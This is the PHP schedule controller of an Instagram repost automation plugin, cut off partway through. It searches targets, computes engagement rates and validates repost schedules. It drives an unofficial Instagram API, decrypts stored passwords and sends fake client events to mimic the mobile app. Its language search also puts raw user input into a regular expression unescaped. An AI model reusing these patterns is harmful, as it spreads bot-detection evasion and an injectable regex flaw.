<?php

namespace Plugins\RepostPro;

use Telegram;

require_once PLUGINS_PATH . "/" . IDNAME . "/models/LogModel.php";
require_once PLUGINS_PATH . "/" . IDNAME . "/vendor/autoload.php";

// Disable direct access
if (!defined('APP_VERSION'))
    die("Yo, what's up?");

/**
 * Schedule Controller
 */
class ScheduleController extends \Controller
{
    /**
     * idname of the plugin for internal use
     */
    const IDNAME = 'repost-pro';

    /**
     * Process
     */
    public function process()
    {
        $AuthUser = $this->getVariable("AuthUser");
        $Route = $this->getVariable("Route");
        $this->setVariable("idname", self::IDNAME);

        // Auth
        if (!$AuthUser) {
            header("Location: " . APPURL . "/login");
            exit;
        } else if ($AuthUser->isExpired()) {
            header("Location: " . APPURL . "/expired");
            exit;
        }

        $user_modules = $AuthUser->get("settings.modules");
        if (!is_array($user_modules) || !in_array(self::IDNAME, $user_modules)) {
            // Module is not accessible to this user
            header("Location: " . APPURL . "/post");
            exit;
        }


        // Get Account
        $Account = \Controller::model("Account", $Route->params->id);
        if (
            !$Account->isAvailable() ||
            $Account->get("user_id") != $AuthUser->get("id")
        ) {
            header("Location: " . APPURL . "/e/" . self::IDNAME);
            exit;
        }
        $this->setVariable("Account", $Account);

        // Get Schedule
        require_once PLUGINS_PATH . "/" . $this->getVariable("idname") . "/models/ScheduleModel.php";
        $Schedule = new ScheduleModel([
            "account_id" => $Account->get("id"),
            "user_id" => $Account->get("user_id")
        ]);
        $this->setVariable("Schedule", $Schedule);

        // Get Captions Templates
        $Captions = \Controller::model("Captions");
        $Captions->where("user_id", $AuthUser->get("id"))
            ->setPageSize(30)
            ->setPage(\Input::get("cp"))
            ->orderBy("id", "DESC")
            ->fetchData();
        $this->setVariable("Captions", $Captions);
        $this->setVariable("BrowseSessionId", \InstagramAPI\Signatures::generateUUID());

        if (\Input::request("action") == "search") {
            $this->search();
        } elseif (\Input::post("action") == "save") {
            $this->save();
        } elseif (\Input::request("action") == "copy-task-settings") {
            $this->copy_task_settings();
        } elseif (\Input::request("action") == "insert-task-settings") {
            $this->insert_task_settings();
        } elseif (\Input::request("action") == "insert-task-settings-all") {
            $this->insert_task_settings_all();
        } elseif (\Input::request("action") == "search-lang") {
            $this->search_lang();
        }

        $this->view(PLUGINS_PATH . "/" . $this->getVariable("idname") . "/views/schedule.php", null);
    }

    private function isGoodERPost($er, $followers)
    {
        if ($followers <= 5000) {
            if ($er >= 5.60) {
                return true;
            } else {
                return false;
            }
        } elseif ($followers <= 20000) {
            if ($er >= 2.43) {
                return true;
            } else {
                return false;
            }
        } elseif ($followers <= 100000) {
            if ($er >= 2.15) {
                return true;
            } else {
                return false;
            }
        } elseif ($followers <= 1000000) {
            if ($er >= 2.05) {
                return true;
            } else {
                return false;
            }
        } else {
            if ($er >= 1.97) {
                return true;
            } else {
                return false;
            }
        }
    }

    private function find_closest($date, $dates, $last)
    {
        $interval               = array();
        $now                    = strtotime(date('Y-m-d'));

        foreach ($dates as $d) {
            $dateTime           = strtotime($date);
            $toTime             = strtotime($d);

            // Do not parse dates older than today
            if (strtotime($d) < $now) {
                continue 1;
            }

            // Only do dates in the future
            if ($toTime < $dateTime) {
                continue 1;
            }
            $interval[$d]       = abs($dateTime - $toTime);
        }

        // If there is no interval, use the latest date
        if (!count($interval)) {
            return $last;
        }

        asort($interval);
        $closest = key($interval);

        return $closest;
    }

    /**
     * Search hashtags, people, locations
     * @return mixed 
     */
    private function search()
    {
        $this->resp->result = 0;
        $AuthUser = $this->getVariable("AuthUser");
        $Account = $this->getVariable("Account");
        $BrowseSessionId = $this->getVariable("BrowseSessionId");

        $query = \Input::request("q");
        if (!$query) {
            $this->resp->msg = __("Missing some of required data.");
            $this->jsonecho();
        }

        $type = \Input::request("type");
        if (!in_array($type, ["hashtag", "hashtag_reels", "location", "people", "people_reels", "collection", "music"])) {
            $this->resp->msg = __("Invalid parameter");
            $this->jsonecho();
        }

        // Login
        try {
            $last_login_timestamp = strtotime($Account->get("last_login"));
            if ($last_login_timestamp && $last_login_timestamp + 30 * 60 > time()) {
                // Instagram Client Mobile
                \InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
                // Storage config
                $storage_config = [
                    "storage" => "file",
                    "basefolder" => SESSIONS_PATH . "/" . $Account->get("user_id") . "/",
                ];
                // Platform detection
                if (function_exists('is_android_session')) {
                    if (is_android_session($Account->get("user_id"), $Account->get("username"))) {
                        $platform = "android";
                    } else {
                        $platform = "ios";
                    }
                    $Instagram = new \InstagramAPI\Instagram(false, false, $storage_config, $platform);
                } else {
                    $Instagram = new \InstagramAPI\Instagram(false, false, $storage_config);
                }
                $Instagram->setVerifySSL(SSL_ENABLED);
                if ($Account->get("proxy")) {
                    $Instagram->setProxy($Account->get("proxy"));
                }
                // Decrypt pass.
                try {
                    $password = \Defuse\Crypto\Crypto::decrypt(
                        $Account->get("password"),
                        \Defuse\Crypto\Key::loadFromAsciiSafeString(CRYPTO_KEY)
                    );
                } catch (Exception $e) {
                    echo __("Encryption error");
                    exit;
                }
                $Instagram->changeUser($Account->get("username"), $password);
                $this->resp->login_for_search = false;
                if (!$Instagram->isMaybeLoggedIn) {
                    $Instagram = \InstagramController::login($Account);
                    $this->resp->login_for_search = true;
                }
            } else {
                $Instagram = \InstagramController::login($Account);
                $Account->set("last_login", date("Y-m-d H:i:s"))->update();
                $this->resp->login_for_search = true;
            }
        } catch (\InstagramAPI\Exception\NetworkException $e) {
            $this->resp->msg = __("We couldn't connect to Instagram. Please try again in few minutes.");
            $this->jsonecho();
        } catch (\InstagramAPI\Exception\EmptyResponseException $e) {
            $this->resp->msg = __("Instagram send us empty response. Please try again in few minutes.");
            $this->jsonecho();
        } catch (\Exception $e) {
            $this->resp->msg = $e->getMessage();
            $this->jsonecho();
        }

        $this->resp->fast_search = false;
        $this->resp->items = [];

        // Get data
        try {
            if ($type == "people" || $type == "people_reels") {
                $search_result = $Instagram->people->search($query);
                if ($search_result->isOk()) {
                    foreach ($search_result->getUsers() as $key => $r) {
                        if ($key < 1) {
                            $er_info = "";

                            $user_info_web = $Instagram->people->getInfoByNameWeb($r->getUsername(), $Account->get("username"), true);
                            // Logging client events
                            $Instagram->event->sendProfileView($r->getPk());

                            $user_info = json_decode($user_info_web);
                            if (isset($user_info)) {
                                if (isset($user_info->graphql->user)) {
                                    if (isset($user_info->graphql->user->edge_owner_to_timeline_media) && ($user_info->graphql->user->edge_followed_by->count > 0)) {
                                        $edge_followed_by = $user_info->graphql->user->edge_followed_by->count;
                                        $er_info = number_format($edge_followed_by, 0, ".", " ") . " " . __("followers") . " · ";
                                        if (isset($user_info->graphql->user->edge_owner_to_timeline_media->edges)) {
                                            $ER_post = null;
                                            $total_actions = null;
                                            $edges = $user_info->graphql->user->edge_owner_to_timeline_media->edges;
                                            foreach ($edges as $key => $edge) {
                                                $total_actions = $total_actions + $edge->node->edge_liked_by->count + $edge->node->edge_media_to_comment->count;
                                            }
                                            if ($total_actions > 0 && count($edges) > 0) {
                                                $ER_post = ($total_actions / (count($edges) * $edge_followed_by)) * 100;
                                                if ($ER_post > 0) {
                                                    $ER_post = number_format($ER_post, 2);
                                                    $er_info = __("ER<sub>post</sub>") . ": " . $ER_post . "%"
                                                        . " · " . ($this->isGoodERPost($ER_post, $edge_followed_by) ? "<span style='color: #20bd20 !important;'>" . __("Good target") . "</span>" : "<span style='color: red !important;'>" . __("Bad target") . "</span>")
                                                        . " · " . $er_info;
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                            $this->resp->items[] = [
                                "value" => $r->getUsername(),
                                "data" => [
                                    "img" => $r->getProfilePicUrl(),
                                    "sub" => $er_info . $r->getFullName(),
                                    "id" => $r->getPk()
                                ]
                            ];
                        } else {
                            $this->resp->items[] = [
                                "value" => $r->getUsername(),
                                "data" => [
                                    "img" => $r->getProfilePicUrl(),
                                    "sub" => $r->getFullName(),
                                    "id" => $r->getPk()
                                ]
                            ];
                        }
                    }
                }
            } elseif ($type == "hashtag" || $type == "hashtag_reels") {
                $search_result = $Instagram->hashtag->search($query);
                if ($search_result->isOk()) {
                    foreach ($search_result->getResults() as $r) {
                        $this->resp->items[] = [
                            "value" => $r->getName(),
                            "data" => [
                                "img" => file_exists(PLUGINS_PATH . "/quick-source-search/assets/img/hashtag-pesq.jpg") ? PLUGINS_URL . "/quick-source-search/assets/img/hashtag-pesq.jpg" : null,
                                "sub" => n__("%s public post", "%s public posts", number_format($r->getMediaCount(), 0, ".", " "), number_format($r->getMediaCount(), 0, ".", " ")),
                                "id" => str_replace("#", "", $r->getName())
                            ]
                        ];
                    }
                }
            } elseif ($type == "location") {
                $search_result = $Instagram->location->findPlaces($query);
                if ($search_result->isOk()) {
                    foreach ($search_result->getItems() as $r) {
                        $address = "";
                        if (!empty($r->getLocation()->getAddress())) {
                            $address = $r->getLocation()->getAddress();
                            if (!empty($r->getLocation()->getCity())) {
                                $address .= ', ' . $r->getLocation()->getCity();
                            }
                        }
                        $this->resp->items[] = [
                            "value" => $r->getLocation()->getName(),
                            "data" => [
                                "img" => file_exists(PLUGINS_PATH . "/quick-source-search/assets/img/location-pesq.jpg") ? PLUGINS_URL . "/quick-source-search/assets/img/location-pesq.jpg" : null,
                                "sub" => $address,
                                "id" => $r->getLocation()->getFacebookPlacesId()
                            ]
                        ];
                    }
                }
            } elseif ($type == "collection") {
                $search_result = $Instagram->collection->getList();
                if ($search_result->isOk()) {
                    foreach ($search_result->getItems() as $r) {
                        $this->resp->items[] = [
                            "value" => $r->getCollectionName(),
                            "data" => [
                                "sub" => false,
                                "id" => $r->getCollectionId()
                            ]
                        ];
                    }
                }
            } elseif ($type == "music") {
                $search_result = $Instagram->music->search($query, $BrowseSessionId);
                if ($search_result->isOk()) {
                    foreach ($search_result->getItems() as $r) {
                        $track = $r->getTrack();
                        if (!empty($track)) {
                            $this->resp->items[] = [
                                "value" => $track->getTitle(),
                                "data" => [
                                    "img" => $track->getCoverArtworkThumbnailUri(),
                                    "sub" => $track->getDisplayArtist(),
                                    "id" => $track->getAudioClusterId()
                                ]
                            ];
                        }
                    }
                }
            }
        } catch (\InstagramAPI\Exception\NetworkException $e) {
            $this->resp->msg = __("We couldn't connect to Instagram. Please try again in few minutes.");
            $this->jsonecho();
        } catch (\InstagramAPI\Exception\EmptyResponseException $e) {
            $this->resp->msg = __("Instagram send us empty response. Please try again in few minutes.");
            $this->jsonecho();
        } catch (\Exception $e) {
            $this->resp->msg = $e->getMessage();
            $this->jsonecho();
        }

        // Logging client events
        $Instagram->event->savePendingEvents();

        $this->resp->result = 1;
        $this->jsonecho();
    }

    /**
     * Search languages
     * @return mixed 
     */
    private function search_lang()
    {
        $this->resp->result = 0;
        $AuthUser = $this->getVariable("AuthUser");
        $Account = $this->getVariable("Account");
        $Schedule = $this->getVariable("Schedule");

        $query = \Input::request("q");
        if (!$query) {
            $this->resp->msg = __("Missing some of required data.");
            $this->jsonecho();
        }

        $type = \Input::request("type");
        if (!in_array($type, ["language"])) {
            $this->resp->msg = __("Invalid parameter");
            $this->jsonecho();
        }

        // All supported languages
        $langs = [
            ["id" => "ab", "name" => __("Abkhaz")],
            ["id" => "af", "name" => __("Afrikaans")],
            ["id" => "am", "name" => __("Amharic")],
            ["id" => "ar", "name" => __("Arabic")],
            ["id" => "ay", "name" => __("Aymara")],
            ["id" => "az-Cyrl", "name" => "🇦🇿 " . __("Azerbaijani, North (Cyrillic)")],
            ["id" => "az-Latn", "name" => "🇦🇿 " . __("Azerbaijani, North (Latin)")],
            ["id" => "be", "name" => "🇧🇾 " . __("Belarusan")],
            ["id" => "bg", "name" => "🇧🇬 " . __("Bulgarian")],
            ["id" => "bi", "name" => "🇧🇬 " . __("Bislama")],
            ["id" => "bn", "name" => "🇧🇩 " . __("Bengali")],
            ["id" => "ln", "name" => __("Lingala")],
            ["id" => "lo", "name" => "🇱🇦 " . __("Lao")],
            ["id" => "lt", "name" => "🇱🇹 " . __("Lithuanian")],
            ["id" => "lv", "name" => "🇱🇻 " . __("Latvian")],
            ["id" => "mh", "name" => "🇲🇭 " . __("Marshallese")],
            ["id" => "mn-Cyrl", "name" => "🇲🇲 " . __("Mongolian, Halh (Cyrillic)")],
            ["id" => "ms-Arab", "name" => "🇲🇾 " . __("Malay (Arabic)")],
            ["id" => "ms-Latn", "name" => "🇲🇾 " . __("Malay (Latin)")],
            ["id" => "mt", "name" => "🇲🇹 " . __("Maltese")],
            ["id" => "nb", "name" => "🇳🇴 " . __("Norwegian, Bokmål")],
            ["id" => "ng", "name" => __("Ndonga")],
            ["id" => "nl", "name" => "🇳🇱 " . __("Dutch")],
            ["id" => "nn", "name" => "🇳🇴 " . __("Norwegian, Nynorsk")],
            ["id" => "nv", "name" => __("Navajo")],
            ["id" => "pl", "name" => "🇵🇱 " . __("Polish")],
            ["id" => "pt-BR", "name" => "🇵🇹 " . __("Portuguese (Brazil)")],
            ["id" => "pt-PT", "name" => "🇵🇹 " . __("Portuguese (Portugal)")],
            ["id" => "ro", "name" => "🇷🇴 " . __("Romanian")],
            ["id" => "ru", "name" => "🇷🇺 " . __("Russian (Русский)")],
            ["id" => "et", "name" => "🇪🇪 " . __("Estonian")],
            ["id" => "eu", "name" => __("Basque")],
            ["id" => "fa", "name" => __("Persian")],
            ["id" => "fi", "name" => "🇫🇮 " . __("Finnish")],
            ["id" => "fj", "name" => __("Fijian")],
            ["id" => "fo", "name" => __("Faroese")],
            ["id" => "fr", "name" => "🇫🇷 " . __("French")],
            ["id" => "fy", "name" => __("Frisian")],
            ["id" => "ga", "name" => "🇮🇪 " . __("Gaelic, Irish")],
            ["id" => "to", "name" => "🇹🇴 " . __("Tonga")],
            ["id" => "tr", "name" => "🇹🇷 " . __("Turkish")],
            ["id" => "tt", "name" => __("Tatar")],
            ["id" => "ty", "name" => __("Tahitian")],
            ["id" => "ug-Arab", "name" => __("Uyghur (Arabic)")],
            ["id" => "ug-Latn", "name" => __("Uyghur (Latin)")],
            ["id" => "uk", "name" => "🇺🇦 " . __("Ukrainian")],
            ["id" => "hi", "name" => __("Hindi")],
            ["id" => "hr", "name" => "🇭🇷 " . __("Croatian")],
            ["id" => "hu", "name" => "🇭🇺 " . __("Hungarian")],
            ["id" => "hy", "name" => "🇦🇲 " . __("Armenian")],
            ["id" => "ia", "name" => __("Interlingua")],
            ["id" => "id", "name" => "🇮🇩 " . __("Indonesian")],
            ["id" => "ig", "name" => __("Igbo")],
            ["id" => "io", "name" => __("Ido")],
            ["id" => "is", "name" => "🇮🇸 " . __("Icelandic")],
            ["id" => "om", "name" => __("Afaan Oromo")],
            ["id" => "it", "name" => "🇮🇹 " . __("Italian")],
            ["id" => "iu", "name" => __("Inuktitut")],
            ["id" => "ja", "name" => "🇯🇵 " . __("Japanese")],
            ["id" => "jv", "name" => __("Javanese")],
            ["id" => "ka", "name" => "🇬🇪 " . __("Georgian")],
            ["id" => "km", "name" => __("Khmer")],
            ["id" => "ko", "name" => "🇰🇷 🇰🇵 " . __("Korean")],
            ["id" => "kr", "name" => __("Kanuri")],
            ["id" => "ku", "name" => __("Kurdish")],
            ["id" => "la", "name" => __("Latin")],
            ["id" => "lg", "name" => __("Ganda")],
            ["id" => "bo", "name" => __("Tibetan")],
            ["id" => "br", "name" => __("Breton")],
            ["id" => "bs-Cyrl", "name" => "🇧🇦 " . __("Bosnian (Cyrillic)")],
            ["id" => "bs-Latn", "name" => "🇧🇦 " . __("🇧🇦 Bosnian (Latin)")],
            ["id" => "ca", "name" => __("Catalan")],
            ["id" => "ch", "name" => __("Chamorro")],
            ["id" => "co", "name" => __("Corsican")],
            ["id" => "cr", "name" => __("Cree")],
            ["id" => "cs", "name" => "🇨🇿 " . __("Czech")],
            ["id" => "cy", "name" => __("Welsh")],
            ["id" => "de", "name" => "🇩🇪 " . __("German")],
            ["id" => "da", "name" => "🇩🇰 " . __("Danish")],
            ["id" => "dz", "name" => __("Dzongkha")],
            ["id" => "el-monoton", "name" => "🇬🇷 " . __("Greek (monotonic)")],
            ["id" => "el-polyton", "name" => "🇬🇷 " . __("Greek (polytonic)")],
            ["id" => "en", "name" => "🇬🇧 🇺🇸 " . __("English")],
            ["id" => "eo", "name" => __("Esperanto")],
            ["id" => "es", "name" => "🇪🇸 " . __("Spanish")],
            ["id" => "sa", "name" => __("Sanskrit")],
            ["id" => "sk", "name" => "🇸🇰 " . __("Slovak")],
            ["id" => "sl", "name" => "🇸🇮 " . __("Slovene")],
            ["id" => "so", "name" => "🇸🇴 " . __("Somali")],
            ["id" => "sq", "name" => "🇦🇱 " . __("Albanian")],
            ["id" => "ss", "name" => __("Swati")],
            ["id" => "sv", "name" => "🇸🇪 " . __("Swedish")],
            ["id" => "ta", "name" => __("Tamil")],
            ["id" => "th", "name" => "🇹🇭 " . __("Thai")],
            ["id" => "tl", "name" => __("Tagalog")],
            ["id" => "gd", "name" => __("Gaelic, Scottish")],
            ["id" => "gl", "name" => __("Galician")],
            ["id" => "gn", "name" => __("Guarani")],
            ["id" => "gu", "name" => __("Gujarati")],
            ["id" => "ha", "name" => __("Hausa")],
            ["id" => "he", "name" => __("Hebrew")],
            ["id" => "ur", "name" => __("Urdu")],
            ["id" => "uz", "name" => "🇺🇿 " . __("Uzbek")],
            ["id" => "ve", "name" => __("Venda")],
            ["id" => "vi", "name" => "🇻🇳 " . __("Vietnamese")],
            ["id" => "wa", "name" => __("Walloon")],
            ["id" => "wo", "name" => __("Wolof")],
            ["id" => "xh", "name" => __("Xhosa")],
            ["id" => "yo", "name" => __("Yoruba")],
            ["id" => "zh-Hans", "name" => "🇨🇳 " . __("Chinese, Mandarin (Simplified)")],
            ["id" => "zh-Hant", "name" => "🇨🇳 " . __("Chinese, Mandarin (Traditional)	")],
            ["id" => "sw", "name" => __("Swahili/Kiswahili")]
        ];

        $this->resp->items = [];
        foreach ($langs as $lang) {
            if ($query) {
                if (preg_match_all('~' . $query . '~i', $lang["name"])) {
                    $this->resp->items[] = [
                        "value" => $lang["name"],
                        "data" => [
                            "id" => $lang["id"]
                        ]
                    ];
                }
            }
        }

        $this->resp->result = 1;
        $this->jsonecho();
    }

    /**
     * Save schedule
     * @return mixed 
     */
    private function save()
    {
        $this->resp->result = 0;
        $AuthUser = $this->getVariable("AuthUser");
        $Account = $this->getVariable("Account");
        $Schedule = $this->getVariable("Schedule");

        $Emojione = new \Emojione\Client(new \Emojione\Ruleset());

        // Targets
        $targets = @json_decode(\Input::post("target"));
        if (!$targets) {
            $targets = [];
        }

        $valid_targets = [];
        foreach ($targets as $t) {
            if (
                isset($t->type, $t->value, $t->id) &&
                in_array($t->type, ["hashtag", "location", "people", "people_reels", "hashtag_reels", "collection", "music"])
            ) {
                $valid_targets[] = [
                    "type" => $t->type,
                    "id" => $t->id,
                    "value" => $t->value,
                    "cluster_id" => isset($t->cluster_id) ? $t->cluster_id : ""
                ];
            }
        }
        $target = json_encode($valid_targets);

        // Check caption
        $caption = \Input::post("caption");
        $caption = $Emojione->shortnameToUnicode($caption);
        $caption = mb_substr($caption, 0, 2200);
        $caption = $Emojione->toShort($caption);

        // Check first comment
        $first_comment = \Input::post("first_comment");
        $first_comment = $Emojione->shortnameToUnicode($first_comment);
        $first_comment = mb_substr($first_comment, 0, 2200);
        $first_comment = $Emojione->toShort($first_comment);

        // End date
        $end_date = count($valid_targets) > 0
            ? "2030-12-12 23:59:59" : date("Y-m-d H:i:s");

        // Remove delay
        $remove_delay = (int)\Input::post("remove_delay");
        if ($remove_delay < 900 /* 15 minutes */) {
            $remove_delay = 0; // Do not remove
        }

        // Daily pause
        $daily_pause = (bool)\Input::post("daily_pause");

        // Metadata Settings
        $metadata_location = (bool)\Input::post("metadata_location");
        $metadata_user = (bool)\Input::post("metadata_user");

        $share_to_stories_hashtag = (bool)\Input::post("share_to_stories_hashtag");
        $share_to_stories_hashtag_value = "";
        if ($share_to_stories_hashtag) {
            $share_to_stories_hashtag_value = \Input::post("share_to_stories_hashtag_value");
            $share_to_stories_hashtag_value = ltrim($share_to_stories_hashtag_value, '#');
        }
        $share_to_stories_username_value = \Input::post("share_to_stories_username_value");
        $share_to_stories_username_value = ltrim($share_to_stories_username_value, '@');
        if ($share_to_stories_username_value) {
            if (!preg_match("/^(?!.*\.\.)(?!.*\.$)[^\W][\w.]{0,29}$/", $share_to_stories_username_value)) {
                $this->resp->msg = __("Custom username value not valid. Please check username syntax.");
                $this->jsonecho();
            }
        }

        if ($Schedule->get("status") == "publishing" && \Input::post("is_active")) {
            $this->resp->msg = __("Repost task in 'publishing' status. Please deactivate task first.");
            $this->jsonecho();
        }

        // Remove incorrect or duplicated usertags 
        $custom_usertags_post_prev = json_decode($Schedule->get("data.custom_usertags_post"));
        $custom_usertags_post = \Input::post("custom_usertags_post");
        $custom_usertags_array = [];
        if (!empty($custom_usertags_post) && $custom_usertags_post_prev !== $custom_usertags_post) {
            if (preg_match_all('/@[a-zA-Z0-9._]*[[0]*\.[0-9]*\,[0]*\.[0-9]*]/', $custom_usertags_post, $matches)) {
                $detected_usertags = array_unique($matches[0]);
                $usertag_names = [];
                foreach ($detected_usertags as $key => $du) {
                    // Safety delay
                    sleep(1);
                    $regex_username = '/@[a-zA-Z0-9._]*/';
                    $regex_coordinate = '/[0]*\.[0-9]*/';
                    if (preg_match($regex_username, $du, $u) && preg_match_all($regex_coordinate, $du, $position)) {
                        if (!in_array(ltrim($u[0], '@'), $usertag_names)) {
                            if (isset($position[0][0]) && isset($position[0][1])) {
                                try {
                                    $Instagram = \InstagramController::login($Account);
                                    $info_by_name = $Instagram->people->getInfoByName(ltrim($u[0], '@'));
                                    if (isset($info_by_name)) {
                                        array_push($custom_usertags_array, [
                                            "position" => [(float)$position[0][0], (float)$position[0][1]],
                                            "user_id" => $info_by_name->getUser()->getPk(),
                                            "username" =>  $info_by_name->getUser()->getUsername()
                                        ]);
                                        array_push($usertag_names, $info_by_name->getUser()->getUsername());
                                    }
                                } catch (\InstagramAPI\Exception\NotFoundException $e) {
                                    // Skip this usertag
                                    unset($detected_usertags[$key]);
                                } catch (\InstagramAPI\Exception\InstagramException $e) {
                                    $this->resp->msg = $e->getMessage();
                                    $this->jsonecho();
                                } catch (\Exception $e) {
                                    $this->resp->msg = $e->getMessage();
                                    $this->jsonecho();
                                }
                            }
                        } else {
                            unset($detected_usertags[$key]);
                        }
                    }
                }
                $this->resp->custom_usertags_array = $custom_usertags_array;
                $custom_usertags_post = implode("\n", $detected_usertags);
                $this->resp->custom_usertags_post = $custom_usertags_post;
            } else {
                $custom_usertags_post = "";
            }
        }

        // Custom repost time
        $custom_repost_time = \Input::post("custom_repost_time");
        $custom_repost_time = preg_replace("/\r|\n/", "", $custom_repost_time);
        $repost_time = [];
        $repost_time_utc = [];
        $repost_time_closest = null;
        $repost_time_closest_regex = null;
        if (!empty($custom_repost_time)) {
            $regex_advanced = "/repost\[(([0-1]?[0-9]|2[0-3])\:[0-5][0-9])\]\{(.*)\}/";
            $regex = "/repost\[(([0-1]?[0-9]|2[0-3])\:[0-5][0-9])\](?!\{)/";
            if (preg_match_all($regex_advanced, $custom_repost_time, $matches)) {
                if (isset($matches[1])) {
                    $dt = $matches[1];
                    foreach ($dt as $key => $d) {
                        $rt_time = new \DateTime(date("Y-m-d") . " " . $d . ":00", new \DateTimeZone($AuthUser->get("preferences.timezone")));
                        $rt_time->setTimezone(new \DateTimeZone("UTC"));
                        $rt_time_utc = strtotime($rt_time->format("Y-m-d H:i:s"));
                        $this->resp->rt_time = $rt_time;
                        $this->resp->rt_time_utc = $rt_time_utc;

                        if (time() > $rt_time_utc) {
                            $this->resp->next_day = true;
                            $time = new \DateTime(date("Y-m-d", time() + 86400) . " " . $d . ":00", new \DateTimeZone($AuthUser->get("preferences.timezone")));
                        } else {
                            $this->resp->next_day = false;
                            $time = new \DateTime(date("Y-m-d") . " " . $d . ":00", new \DateTimeZone($AuthUser->get("preferences.timezone")));
                        }

                        $r_time = $time->format("H:i");
                        array_push($repost_time, $r_time);

                        $time->setTimezone(new \DateTimeZone("UTC"));
                        array_push($repost_time_utc, $time->format("Y-m-d H:i:s"));
                    }
                }
                if (isset($matches[3])) {
                    $dd = $matches[3];
                    foreach ($dd as $key => $d) {
                        $r_json = @json_decode("{" . $d . "}");
                        if (!is_object($r_json)) {
                            $this->resp->msg = __("Incorrect repost time pattern set in section %s, please check pattern syntax.", __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        // Check post format
                        if (!isset($r_json->format)) {
                            $this->resp->msg = __("Value %s is missing in pattern in section %s", '"format"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }
                        if (!in_array($r_json->format, ["photo", "video", "album", "reel"])) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"format"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        // Check target type
                        if (!isset($r_json->target_type)) {
                            $this->resp->msg = __("Value %s is missing in pattern in section %s", '"target_type"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }
                        if (!in_array($r_json->target_type, ["hashtag", "location", "people", "people_reels", "hashtag_reels", "collection", "music"])) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"target_type"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        // Check target type for "reel" post
                        if (($r_json->format == "reel") && !in_array($r_json->target_type, ["people_reels", "hashtag_reels", "music"])) {
                            $this->resp->msg = __("Incorrect %s value for \"reel\" post format in section %s", '"target_type"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        // Check target value
                        if (!isset($r_json->target_value)) {
                            $this->resp->msg = __("Value %s is missing in pattern in section %s", '"target_value"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        // Check is target value defined in targets list with search
                        $target_defined = false;
                        foreach ($targets as $t) {
                            if (($t->value == $r_json->target_value || $t->value . " " . __("(reels)") == $r_json->target_value) && $t->type == $r_json->target_type) {
                                $target_defined = true;
                            }
                        }

                        if (!$target_defined) {
                            $this->resp->msg = __("Target value %s with type %s of custom repost time pattern not exist in targets list. Please add this target via search first.", $r_json->target_value, $r_json->target_type);
                            $this->jsonecho();
                        }

                        // Optionally
                        if (isset($r_json->shuffle_feed_items) && !is_bool($r_json->shuffle_feed_items)) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"shuffle_feed_items"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        if (isset($r_json->share_to_facebook_post) && !is_bool($r_json->share_to_facebook_post)) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"share_to_facebook_post"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        if (isset($r_json->share_to_facebook_story) && !is_bool($r_json->share_to_facebook_story)) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"share_to_facebook_story"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        if (isset($r_json->share_to_facebook_reel) && !is_bool($r_json->share_to_facebook_reel)) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"share_to_facebook_reel"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }

                        if (isset($r_json->share_to_timeline_reel) && !is_bool($r_json->share_to_timeline_reel)) {
                            $this->resp->msg = __("Incorrect %s value in section %s", '"share_to_timeline_reel"', __("Custom time for the repost"));
                            $this->jsonecho();
                        }
                    }
                }
            } elseif (preg_match_all($regex, $custom_repost_time, $matches)) {
                if (isset($matches[1])) {
                    $dt = $matches[1];
                    foreach ($dt as $key => $d) {
                        $rt_time = new \DateTime(date("Y-m-d") . " " . $d . ":00", new \DateTimeZone($AuthUser->get("preferences.timezone")));
                        $rt_time->setTimezone(new \DateTimeZone("UTC"));
                        $rt_time_utc = strtotime($rt_time->format("Y-m-d H:i:s"));
                        $this->resp->rt_time = $rt_time;
                        $this->resp->rt_time_utc = $rt_time_utc;

                        if (time() > $rt_time_utc) {
                            $this->resp->next_day = true;
                            $time = new \DateTime(date("Y-m-d", time() + 86400) . " " . $d . ":00", new \DateTimeZone($AuthUser->get("preferences.timezone")));
                        } else {
                            $this->resp->next_day = false;
                            $time = new \DateTime(date("Y-m-d") . " " . $d . ":00", new \DateTimeZone($AuthUser->get("preferences.timezone")));
                        }

                        $r_time = $time->format("H:i");
                        array_push($repost_time, $r_time);

                        $time->setTimezone(new \DateTimeZone("UTC"));
                        array_push($repost_time_utc, $time->format("Y-m-d H:i:s"));
                    }
                }
            } else {
                $this->resp->msg = __("Incorrect repost time pattern set in section %s, please check pattern syntax.", __("Custom time for the repost"));
                $this->jsonecho();
            }
            $repost_time = array_unique($repost_time);
            $this->resp->repost_time = $repost_time;
            $repost_time_utc = array_unique($repost_time_utc);
            $this->resp->repost_time_utc = $repost_time_utc;
            if (!empty($repost_time_utc)) {
                $repost_time_closest = $this->find_closest(date("Y-m-d H:i:s", time()), $repost_time_utc, end($repost_time_utc));
                $this->resp->repost_time_closest = $repost_time_closest;

                $rtcr_time = new \DateTime($repost_time_closest);
                $rtcr_time->setTimezone(new \DateTimeZone($AuthUser->get("preferences.timezone")));
                $repost_time_closest_regex = $rtcr_time->format("H:i");
                $this->resp->repost_time_closest_regex = $repost_time_closest_regex;
            }
            $this->resp->time_utc = date("Y-m-d H:i:s", time());
        }

        // Language filtration
        $languages = @json_decode(\Input::post("language"));
        if (!$languages) {
            $languages = [];
        }

        $valid_languages = [];
        foreach ($languages as $t) {
            if (
                isset($t->type, $t->value, $t->id) &&
                in_array($t->type, ["language"])
            ) {
                $valid_languages[] = [
                    "type" => $t->type,
                    "id" => $t->id,
                    "value" => $t->value
                ];
            }
        }
        $language = json_encode($valid_languages);

        if (\Input::post("is_active")) {
            $AuthUser->set("data.is_repost_pro_task_active." . $Account->get("id"), true)->save();
        } else {
            $AuthUser->set("data.is_repost_pro_task_active." . $Account->get("id"), false)->save();
        }

